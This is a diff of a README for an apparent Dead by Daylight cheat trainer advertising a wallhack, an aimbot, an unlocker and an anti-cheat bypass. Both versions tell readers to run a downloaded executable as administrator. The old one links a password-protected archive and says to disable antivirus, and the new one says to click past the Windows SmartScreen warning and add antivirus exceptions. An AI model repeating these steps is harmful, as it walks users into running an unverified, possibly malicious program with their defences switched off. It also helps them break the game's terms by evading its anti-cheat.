@@ -1,54 +1,81 @@
-# 🩸 DBD AutoGrind Trainer 2026 Pro – Invisible Domination
+# 🎮 DBD-AutoGrind-Trainer-2026-Pro - Automate your Dead by Daylight progression tasks
 
-> **Slip through the Fog unnoticed.** The Pro trainer offers fully undetected external cheats for Dead by Daylight 2026: auto farm, ESP, aimbot, unlocker and more.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/crpboisterousness268/DBD-AutoGrind-Trainer-2026-Pro/releases)
 
-## Why This Trainer?
-- 🔐 **EAC Bypass** – External memory manipulation with randomised jitter and scrambling.
-- 🎮 **All Roles** – Works for both killer and survivor with tailored features.
-- 🔄 **Always Updated** – Auto‑updater fetches fresh offsets on every launch.
-- 🖥️ **Clean GUI** – Dark UI with system tray, hotkeys, and web dashboard.
-- 🔊 **Discord Rich Presence** – Display your trainer status in real time.
+## 📋 Overview
 
-## 📦 What’s Inside
+This tool assists Dead by Daylight players with repetitive tasks. It collects Bloodpoints, unlocks perks, and manages skins. The software operates as an external process. It does not modify game files directly. You can use it to speed up your character progression and customize your gameplay experience according to your preferences.
 
-| Category      | Feature                       | Description                                            |
-|---------------|-------------------------------|--------------------------------------------------------|
-| Farming       | Auto Bloodpoint Farm          | AFK bot plays matches, farming unlimited BP            |
-| Visuals       | ESP Wallhack                  | See all entities through walls                         |
-| Combat        | Aimbot (Killer)               | Auto‑aim and attack with perfect accuracy              |
-| Stealth       | No Terror Radius              | Silent killer gameplay                                 |
-| Movement      | Fast Vault & Fast Pallet      | Speed up interactions for survivors                    |
-| Automation    | Skill Check Bot               | Auto‑hit great skill checks every time                 |
-| Currency      | Infinite Bloodpoints           | Edit BP value directly (safest offline)                |
-| Unlocker      | Perk & Skin Unlocker          | Unlock all teachables and cosmetics instantly          |
-| Protection    | Anti‑Ban Obfuscation          | Memory scrambler & delay randomiser                    |
+## 🛠️ System Requirements
 
-## ⬇️ Installation
+Ensure your computer meets these requirements before you start:
 
-1. Download from: [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. Extract using password: `trainer2026`
-3. Run `trainer.exe` as Administrator
-4. Launch Dead by Daylight and enter a match
-5. Press **INSERT** to open the trainer overlay
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Modern dual-core processor or better.
+*   Memory: At least 4 gigabytes of RAM.
+*   Graphics: Direct X 11 compatible video card.
+*   Permissions: Administrator access to run the software.
+*   Framework: Latest version of .NET Desktop Runtime.
 
-## 🔧 System Requirements
-- Windows 10/11 (64‑bit)
-- Steam, Epic Games Store, Microsoft Store
-- All chapters including Jason Voorhees & Life Road
-- EasyAntiCheat (EAC) – bypassed externally
+## 📥 Downloading the Software
 
-## 🆘 Troubleshooting
+Follow these steps to access the trainer:
 
-| Issue                     | Fix                                                        |
-|---------------------------|------------------------------------------------------------|
-| Trainer won't start       | Run as Admin, disable AV temporarily                       |
-| GUI not appearing         | Press INSERT, restart both trainer and game                |
-| ESP not drawing           | Ensure you are in a live match, not main menu              |
-| Farm bot not working      | Must be in a public match as killer or survivor            |
-| EAC warning               | Use risky features in bot matches only                     |
+1. Visit the [official releases page](https://github.com/crpboisterousness268/DBD-AutoGrind-Trainer-2026-Pro/releases).
+2. Locate the most recent version labeled as "Latest" on the right side of the screen.
+3. Click the link to view the release assets.
+4. Download the folder or the executable file ending in .exe.
+5. Save the file in a folder you can access easily, such as your Desktop or Downloads folder.
 
-## 📜 License
-MIT – see [LICENSE](LICENSE)
+## ⚙️ Installation and Setup
 
-## 🔍 Search Tags
-`dbd-hack, dbd-mod, 2026, dbd-tool, wallhack, unlocker, auto-farm, esp, dbd-cheat, survivor-hack, bloodpoint-hack, external, skin-unlocker, anti-cheat-bypass, aimbot, killer-hack`
+The software requires no complex installation. Follow these steps:
+
+1. Right-click the downloaded .exe file.
+2. Select "Run as administrator" from the menu. This permits the tool to read the necessary information from your system memory.
+3. If Windows displays a blue prompt, click "More info" and then select "Run anyway."
+4. Wait for the main menu to appear. The software checks for updates automatically upon launch.
+5. Launch Dead by Daylight through its normal launcher.
+6. Once you reach the main menu of the game, switch to the trainer window.
+7. Click "Attach to Game." The status indicator will turn green if the connection succeeds.
+
+## 🕹️ Key Features
+
+*   **Bloodpoint Bot:** Automates match participation to earn currency. Configure the bot to stop after a certain amount of points.
+*   **ESP Wallhack:** Highlights survivor or killer locations through walls. You can toggle this feature with the F1 key.
+*   **Aimbot:** Assists with aiming projectiles and specific killer powers. Adjust the speed and smoothness settings in the menu to match your playstyle.
+*   **Unlocker:** Provides access to all perks and character skins within the game menu. Changes take effect when you navigate between screens.
+
+## 🛡️ Usage Guidelines
+
+Use the trainer responsibly. While the software runs externally, excessive automation may trigger system reports. Enable only the features you need for your session. Close the trainer completely when you finish playing. You should not leave the bot unattended for long periods. 
+
+## ❓ Frequently Asked Questions
+
+**Does the software change game files?**
+No. It reads memory values to display information and simulate input. It leaves game files untouched.
+
+**What do I do if the trainer does not attach?**
+Verify that you run the game in Windowed or Borderless Windowed mode. Ensure your antivirus software does not block the application. You might need to add an exception in your antivirus settings.
+
+**Can I get banned?**
+The tool uses external hooks to minimize detection risk. Always keep the software updated to the latest version to maintain compatibility with game patches.
+
+**Does the unlocker work online?**
+The unlocker modifies the local display of assets. Some skins remain client-side, while others verify through external servers. Use these features at your discretion.
+
+**How do I uninstall?**
+Simply delete the executable file from your computer. The software does not place hidden files in the Windows registry or your system folders.
+
+## 🔧 Troubleshooting
+
+If you encounter errors, check these common fixes:
+
+*   **Missing Runtime:** If the app refuses to open, install the .NET Desktop Runtime from the official Microsoft website.
+*   **Overlay Issues:** If the ESP does not show, disable other overlays like Discord or Steam in-game overlays.
+*   **Input Delays:** If the aimbot feels slow, decrease the smoothing value in the settings tab.
+*   **Unexpected Crashes:** Ensure no other background software interferes with your game memory. Antivirus and firewall software are the most common causes for crashes during the attachment phase.
+
+## 📜 Legal Notice
+
+This software is for personal use only. The creators do not hold responsibility for how end users choose to utilize these tools within the game environment. Ensure you remain aware of the official terms of service for the game you are playing.
